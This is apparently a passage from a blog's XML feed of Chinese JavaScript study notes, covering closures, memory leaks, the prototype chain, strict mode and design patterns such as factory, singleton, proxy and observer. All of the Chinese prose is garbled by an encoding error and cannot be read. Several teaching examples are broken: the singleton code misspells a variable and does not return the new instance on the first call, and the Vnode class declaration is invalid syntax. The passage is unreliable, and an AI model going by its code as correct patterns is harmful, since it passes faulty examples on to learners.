class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function addHandler() &#123;</span><br><span class="line">  var el = document.getElementById(&apos;el&apos;);</span><br><span class="line">  el.onclick = function() &#123;</span><br><span class="line">    el.style.backgroundColor = &apos;red&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™æ®µä»£ç åˆ›å»ºäº†ä¸€ä¸ªå…ƒç´ ï¼Œå½“å®ƒè¢«ç‚¹å‡»çš„æ—¶å€™å˜çº¢ï¼Œä½†åŒæ—¶å®ƒä¼šå‘ç”Ÿå†…å­˜æ³„æ¼ã€‚å› ä¸ºå¯¹<code>el</code>çš„å¼•ç”¨ä¸å°å¿ƒè¢«æ”¾åœ¨ä¸€ä¸ªåŒ¿åå†…éƒ¨å‡½æ•°ä¸­ã€‚åœ¨JSå¯¹è±¡ï¼Œè¿™ä¸ªå†…éƒ¨å‡½æ•°å’Œæœ¬åœ°å¯¹è±¡ä¹‹é—´<code>el</code>åˆ›å»ºäº†ä¸€ä¸ªå¾ªç¯å¼•ç”¨ã€‚è§£å†³æ–¹æ³•:ä¸è¦ä½¿ç”¨<code>el</code>å˜é‡ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function addHandler() &#123;</span><br><span class="line">  document.getElementById(&apos;el&apos;).onclick = function() &#123;</span><br><span class="line">    this.style.backgroundColor = &apos;red&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>åœ¨JSé‡Œï¼Œå¯¹è±¡å¯ä»¥è¢«çœ‹ä½œæ˜¯ä¸€ç»„å±æ€§çš„é›†åˆã€‚ç”¨å¯¹è±¡å­—é¢é‡è¯­æ³•æ¥å®šä¹‰ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè‡ªåŠ¨åˆå§‹åŒ–ä¸€ç»„å±æ€§ã€‚ä¾‹å¦‚ï¼Œä½ å®šä¹‰äº†ä¸€ä¸ª var a = â€œhelloâ€ï¼Œ é‚£ä¹ˆaæœ¬èº«å°±ä¼šæœ‰a.substringè¿™ä¸ªæ–¹æ³•ï¼Œä»¥åŠa.lengthè¿™ä¸ªå±æ€§ã€‚<br><br></li></ul><h4 id="2-3-é—­åŒ…"><a href="#2-3-é—­åŒ…" class="headerlink" title="2.3 é—­åŒ…"></a>2.3 é—­åŒ…</h4><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>myFunc</code>æ˜¯æ‰§è¡Œ<code>makeFunc</code>æ—¶åˆ›å»ºçš„<code>displayName</code>å‡½æ•°å®ä¾‹çš„å¼•ç”¨ï¼Œè€Œ<code>displayName</code>å®ä¾‹ä»å¯è®¿é—®å…¶è¯æ³•ä½œç”¨åŸŸä¸­çš„å˜é‡ï¼Œå³å¯è®¿é—®åˆ°<code>name</code>ã€‚ç”±æ­¤ï¼Œå½“<code>myFunc</code>è¢«è°ƒç”¨æ—¶ï¼Œ<code>name</code>ä»å¯è¢«è®¿é—®ï¼Œå…¶å€¼<code>Mozilla</code>è¢«ä¼ é€’åˆ°<code>alert</code>ä¸­ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function makeFunc() &#123;</span><br><span class="line">  var name = &apos;Mozilla&apos;;</span><br><span class="line">  function displayName() &#123;</span><br><span class="line">    alert(name)</span><br><span class="line">  &#125;</span><br><span class="line">  return displayName;</span><br><span class="line">&#125;</span><br><span class="line">var myFunc = makeFunc();</span><br><span class="line">myFunc();</span><br></pre></td></tr></table></figure></p><p>ç”±äºå¾ªååœ¨äº‹ä»¶è§¦å‘ä¹‹å‰æ—©å·²æ‰§è¡Œå®Œæ¯•ï¼Œå˜é‡å¯¹è±¡<code>item</code>ï¼ˆè¢«ä¸‰ä¸ªé—­åŒ…æ‰€å…±äº«ï¼‰å·²ç»æŒ‡å‘äº†<code>helpText</code>çš„æœ€åä¸€é¡¹ã€‚æ­¤æ—¶ï¼Œå¯ä½¿ç”¨åŒ¿åé—­åŒ…ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨<code>let item = helpText[i]</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function showHelp(help) &#123;</span><br><span class="line">  document.getElementById(&apos;help&apos;).innerHTML = help;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setupHelp() &#123;</span><br><span class="line">  var helpText = [</span><br><span class="line">      &#123;&apos;id&apos;: &apos;email&apos;, &apos;help&apos;: &apos;Your e-mail address&apos;&#125;,</span><br><span class="line">      &#123;&apos;id&apos;: &apos;name&apos;, &apos;help&apos;: &apos;Your full name&apos;&#125;,</span><br><span class="line">      &#123;&apos;id&apos;: &apos;age&apos;, &apos;help&apos;: &apos;Your age (you must be over 16)&apos;&#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">  for (var i = 0; i &lt; helpText.length; i++) &#123;</span><br><span class="line">    (function() &#123;</span><br><span class="line">       var item = helpText[i];</span><br><span class="line">       document.getElementById(item.id).onfocus = function() &#123;</span><br><span class="line">         showHelp(item.help);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;)(); // é©¬ä¸ŠæŠŠå½“å‰å¾ªç¯é¡¹çš„itemä¸äº‹ä»¶å›è°ƒç›¸å…³è”èµ·æ¥</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupHelp();</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-é«˜çº§"><a href="#3-é«˜çº§" class="headerlink" title="3. é«˜çº§"></a>3. é«˜çº§</h3><h4 id="3-1-ç»§æ‰¿ä¸åŸå‹é“¾"><a href="#3-1-ç»§æ‰¿ä¸åŸå‹é“¾" class="headerlink" title="3.1 ç»§æ‰¿ä¸åŸå‹é“¾"></a>3.1 ç»§æ‰¿ä¸åŸå‹é“¾</h4><p>jSå¯¹è±¡æœ‰ä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªåŸå‹å¯¹è±¡çš„é“¾ã€‚å½“è¯•å›¾è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå®ƒä¸ä»…ä»…åœ¨è¯¥å¯¹è±¡ä¸Šæœå¯»ï¼Œè¿˜ä¼šæœå¯»è¯¥å¯¹è±¡çš„åŸå‹ï¼Œä»¥åŠè¯¥å¯¹è±¡çš„åŸå‹çš„åŸå‹ï¼Œä¾æ¬¡å±‚å±‚å‘ä¸Šæœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåå­—åŒ¹é…çš„å±æ€§æˆ–åˆ°è¾¾åŸå‹é“¾çš„æœ«å°¾ã€‚<em>å‡ ä¹æ‰€æœ‰JSä¸­çš„å¯¹è±¡éƒ½æ˜¯ä½äºåŸå‹é“¾é¡¶ç«¯çš„Objectçš„å®ä¾‹ã€‚</em></p><p>éå†å¯¹è±¡çš„å±æ€§æ—¶ï¼ŒåŸå‹é“¾ä¸Šçš„æ¯ä¸ªå¯æšä¸¾å±æ€§éƒ½ä¼šè¢«æšä¸¾å‡ºæ¥ã€‚è¦æ£€æŸ¥å¯¹è±¡æ˜¯å¦å…·æœ‰è‡ªå·±å®šä¹‰çš„å±æ€§ï¼Œè€Œä¸æ˜¯å…¶åŸå‹é“¾ä¸Šçš„æŸä¸ªå±æ€§ï¼Œåˆ™å¿…é¡»ä½¿ç”¨æ‰€æœ‰å¯¹è±¡ä»<code>Object.prototype</code>ç»§æ‰¿çš„<code>hasOwnProperty</code>ã€‚<code>g.hasOwnProperty(&#39;vertices&#39;)</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var o = new Foo(); </span><br><span class="line"></span><br><span class="line">// ç›¸å½“äº</span><br><span class="line">var o = new Object();</span><br><span class="line">o.__proto__ = Foo.prototype;</span><br><span class="line">Foo.call(o);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-ä¸¥æ ¼æ¨¡å¼"><a href="#3-2-ä¸¥æ ¼æ¨¡å¼" class="headerlink" title="3.2 ä¸¥æ ¼æ¨¡å¼"></a>3.2 ä¸¥æ ¼æ¨¡å¼</h4><p>å¼€å¯ä¸¥æ ¼æ¨¡å¼  <code>&quot;use strict&quot;;</code></p><table><thead><tr><th></th><th style="text-align:center">ä¸¥æ ¼æ¨¡å¼ä¸‹æŠ›å‡ºå¼‚å¸¸</th></tr></thead><tbody><tr><td>1. æ— æ³•æ„å¤–åˆ›å»ºå…¨å±€å˜é‡</td><td style="text-align:center"><code>mistypedVariable = 17;</code></td></tr><tr><td>2. ç»™å¼•èµ·é™é»˜å¤±è´¥çš„èµ‹å€¼æ“ä½œæŠ›å‡ºå¼‚å¸¸</td><td style="text-align:center"><code>var obj1 = {}; Object.defineProperty(obj1, &quot;x&quot;, { value: 42, writable: false }); obj1.x = 9</code></td></tr><tr><td>3. è¯•å›¾åˆ é™¤ä¸å¯åˆ é™¤çš„å±æ€§ä¼šæŠ›å‡ºå¼‚å¸¸</td><td style="text-align:center"><code>delete Object.prototype</code></td></tr><tr><td>4. å±æ€§ååœ¨åŒä¸€å¯¹è±¡å†…å¿…é¡»å”¯ä¸€</td><td style="text-align:center"><code>var o = { p: 1, p: 2}</code></td></tr><tr><td>5. å‡½æ•°çš„å‚æ•°åå”¯ä¸€</td><td style="text-align:center"><code>function sum(a, a, c){}</code></td></tr><tr><td>6. ç¦æ­¢å…«è¿›åˆ¶æ•°å­¦è¯­æ³•</td><td style="text-align:center"><code>var a = 0o10;</code></td></tr><tr><td>7. ç¦æ­¢è®¾ç½®primitiveå€¼å¾—å±æ€§</td><td style="text-align:center"><code>false.true = &quot;&quot;</code></td></tr><tr><td>8. ç¦ç”¨with</td><td style="text-align:center"><code>with(obj){}</code></td></tr><tr><td>9. evalä¸å†ä¸ºä¸Šå±‚èŒƒå›´å¼•å…¥æ–°å˜é‡</td><td style="text-align:center"></td></tr><tr><td>10. ç¦æ­¢åˆ é™¤å£°æ˜å˜é‡</td><td style="text-align:center"><code>var x; delete x;</code></td></tr></tbody></table><ol start="11"><li>evalå’Œargumentsä¸èƒ½é€šè¿‡ç¨‹åºè¯­æ³•è¢«ç»‘å®šæˆ–èµ‹å€¼</li><li>å‚æ•°çš„å€¼ä¸ä¼šéšargumentså¯¹è±¡çš„å€¼å¾—æ”¹å˜è€Œæ”¹å˜   | <code>var a = 17; function f(a){ a = 42 ; console.log(arguments[0] // 17)}</code></li><li>ä¸å†æ”¯æŒarguments.callee        | æ­£å¸¸æ¨¡å¼ä¸‹,arguments.calleeæŒ‡å‘å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°<br><br></li></ol><h4 id="3-3-å†…å­˜ç®¡ç†"><a href="#3-3-å†…å­˜ç®¡ç†" class="headerlink" title="3.3 å†…å­˜ç®¡ç†"></a>3.3 å†…å­˜ç®¡ç†</h4><p>å†…å­˜ç”Ÿå‘½å‘¨æœŸï¼š åˆ†é…ä½ æ‰€éœ€è¦çš„å†…å­˜ã€ä½¿ç”¨åˆ†é…åˆ°çš„å†…å­˜ã€ä¸éœ€è¦æ—¶å°†å…¶é‡Šæ”¾</p>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>è®¾è®¡æ¨¡å¼</title>
      <link href="/2019/09/14/JS%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2019/09/14/JS%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h3 id="1-åŸºæœ¬æ¦‚å¿µ"><a href="#1-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="1. åŸºæœ¬æ¦‚å¿µ"></a>1. åŸºæœ¬æ¦‚å¿µ</h3><h3 id="2-è®¾è®¡æ¨¡å¼"><a href="#2-è®¾è®¡æ¨¡å¼" class="headerlink" title="2. è®¾è®¡æ¨¡å¼"></a>2. è®¾è®¡æ¨¡å¼</h3><h4 id="2-1-å·¥å‚æ¨¡å¼"><a href="#2-1-å·¥å‚æ¨¡å¼" class="headerlink" title="2.1 å·¥å‚æ¨¡å¼"></a>2.1 å·¥å‚æ¨¡å¼</h4><p>jQueryæ˜¯ä¸€ä¸ªç±»ï¼Œ<code>$(&#39;div&#39;)</code>æ˜¯ä¸€ä¸ªå®ä¾‹ã€‚ å·¥å‚æ¨¡å¼éœ€è¦å®šä¹‰ä¸€ä¸ªcreator <code>$</code>, æ¥åˆ›å»ºå®ä¾‹ã€‚è¿™æ ·å¯ä»¥ç›´æ¥è°ƒç”¨<code>$(&#39;div&#39;)</code>ï¼Œ è€Œä¸ç”¨<code>new jQuery(&#39;div&#39;)</code>ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jQuery</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(selector) &#123;</span><br><span class="line">        <span class="keyword">let</span> slice = <span class="built_in">Array</span>.prototype.slice</span><br><span class="line">        <span class="keyword">let</span> dom = slice.call(<span class="built_in">document</span>.querySelectorAll(selector))</span><br><span class="line">        <span class="keyword">let</span> len = dom ? dom.length : <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">this</span>[i] = dom[i]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.length = len</span><br><span class="line">        <span class="keyword">this</span>.selector = selector || <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    append(node) &#123;&#125;</span><br><span class="line">    addClass(name) &#123;&#125;</span><br><span class="line">    html(data) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// creator</span></span><br><span class="line"><span class="built_in">window</span>.$ = <span class="function"><span class="keyword">function</span> (<span class="params">selector</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> jQuery(selector)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>React.creteElementåˆ›å»ºè™šæ‹ŸDOMã€‚å·¥å‚æ¨¡å¼ä½¿å¾—æ„é€ å‡½æ•°å’Œåˆ›å»ºè€…åˆ†ç¦»ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vnode</span>(<span class="title">tag</span>, <span class="title">attrs</span>, <span class="title">children</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">React.createElement = <span class="function"><span class="keyword">function</span>(<span class="params">tag, attrs, children</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Vnode(tag, attrs, children)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-å•ä¾‹æ¨¡å¼"><a href="#2-2-å•ä¾‹æ¨¡å¼" class="headerlink" title="2.2 å•ä¾‹æ¨¡å¼"></a>2.2 å•ä¾‹æ¨¡å¼</h4><p>ç¡®ä¿ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªå®ä¾‹ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¤šæ¬¡å¼•å…¥jqueryï¼Œä½†å…¶å®åªä¼šæœ‰ä¸€ä¸ªjQueryè¢«åˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.jQuery !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>.jQuery</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å•ä¾‹æ¨¡å¼éœ€è¦åœ¨å®šä¹‰ä¸€ä¸ªè·å–å”¯ä¸€å®ä¾‹çš„æ–¹æ³•ï¼Œç¡®ä¿å¤šæ¬¡è°ƒç”¨çš„æ˜¯åŒä¸€ä¸ªå®ä¾‹ã€‚å¦‚ï¼šReactä¸­çš„storeä¹Ÿæ˜¯åªå…è®¸æœ‰ä¸€ä¸ªå®ä¾‹ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleObject</span> </span>&#123;</span><br><span class="line">    login() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'login'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SingleObject.getInstance = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> instance;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!instacne) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> SingleObject;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj1 = SingleObject.getInstance();</span><br><span class="line"><span class="keyword">let</span> obj2 = SingleObject.getInstance();</span><br><span class="line"><span class="built_in">console</span>.log(obj1 === obj2);     <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-é€‚é…å™¨æ¨¡å¼"><a href="#2-3-é€‚é…å™¨æ¨¡å¼" class="headerlink" title="2.3 é€‚é…å™¨æ¨¡å¼"></a>2.3 é€‚é…å™¨æ¨¡å¼</h4><p>Vueä¸­çš„computedå±æ€§ï¼Œè·å–å½“å‰ä¿¡æ¯ï¼Œå¤„ç†åæ¥é€‚é…é¡µé¢éœ€è¦ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; reversedMsg &#125;&#125;<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">        data: &#123;</span></span><br><span class="line"><span class="javascript">            msg: <span class="string">'hello'</span></span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        computed: &#123;</span></span><br><span class="line"><span class="javascript">            reversedMsg: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="keyword">this</span>.msg.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-è£…é¥°å™¨æ¨¡å¼"><a href="#2-4-è£…é¥°å™¨æ¨¡å¼" class="headerlink" title="2.4 è£…é¥°å™¨æ¨¡å¼"></a>2.4 è£…é¥°å™¨æ¨¡å¼</h4><p>ä¸ºå¯¹è±¡æ·»åŠ æ–°åŠŸèƒ½ï¼Œä¸æ”¹å˜å…¶åŸæœ‰çš„ç»“æ„å’ŒåŠŸèƒ½ã€‚ç¬¬ä¸‰æ–¹åº“<a href="https://github.com/jayphelps/core-decorators" target="_blank" rel="noopener">core-decorators</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readonly</span>(<span class="params">target, name, descriptor</span>) </span>&#123;</span><br><span class="line">    descriptor.writable = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> descriptor</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">'A'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @readonly</span><br><span class="line">    name() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span>`</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> Person();</span><br><span class="line">p.name = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(<span class="number">100</span>) &#125;   <span class="comment">// æŠ¥é”™ï¼Œp.nameæ˜¯åªè¯»</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-5-ä»£ç†æ¨¡å¼"><a href="#2-5-ä»£ç†æ¨¡å¼" class="headerlink" title="2.5 ä»£ç†æ¨¡å¼"></a>2.5 ä»£ç†æ¨¡å¼</h4><p>ä½¿ç”¨è€…æ— æƒè®¿é—®ç›®æ ‡å¯¹è±¡ï¼Œä¸­é—´åŠ ä»£ç†ï¼Œé€šè¿‡ä»£ç†åšæˆæƒå’Œæ§åˆ¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ˜æ˜Ÿ</span></span><br><span class="line"><span class="keyword">let</span> star = &#123; <span class="attr">name</span>: <span class="string">'å¼ XX'</span>, <span class="attr">phone</span>: <span class="string">'13910733521'</span>,&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»çºªäºº</span></span><br><span class="line"><span class="keyword">let</span> agent = <span class="keyword">new</span> <span class="built_in">Proxy</span>(star, &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> (<span class="params">target, key</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// å…è®¸å–å€¼å‰æ“ä½œ</span></span><br><span class="line">        <span class="keyword">return</span> target[key]</span><br><span class="line">    &#125;,</span><br><span class="line">    set: <span class="function"><span class="keyword">function</span> (<span class="params">target, key, val</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// å…è®¸èµ‹å€¼å‰æ“ä½œ</span></span><br><span class="line">        target[key] = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-6-è§‚å¯Ÿè€…æ¨¡å¼"><a href="#2-6-è§‚å¯Ÿè€…æ¨¡å¼" class="headerlink" title="2.6 è§‚å¯Ÿè€…æ¨¡å¼"></a>2.6 è§‚å¯Ÿè€…æ¨¡å¼</h4><p>Event Bus<br>å¸¸è§åœºæ™¯ï¼šç½‘é¡µäº‹ä»¶ç»‘å®šï¼Œ promiseï¼Œ jquery callbacks, nodejsè‡ªå®šä¹‰äº‹ä»¶<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‘å¸ƒè€…</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.state = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.observers = [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  getState() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.state;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setState(state) &#123;</span><br><span class="line">    <span class="keyword">this</span>.state = state;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  attach(observer) &#123;</span><br><span class="line">    <span class="keyword">this</span>.observers.push(observer);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  notifyAllObservers() &#123;</span><br><span class="line">    <span class="keyword">this</span>.observers.forEach(<span class="function"><span class="params">observer</span> =&gt;</span> &#123;</span><br><span class="line">      observer.update();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¢é˜…è€…</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(name, subject) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    <span class="keyword">this</span>.subject.attach(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  update() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> update, state: <span class="subst">$&#123;<span 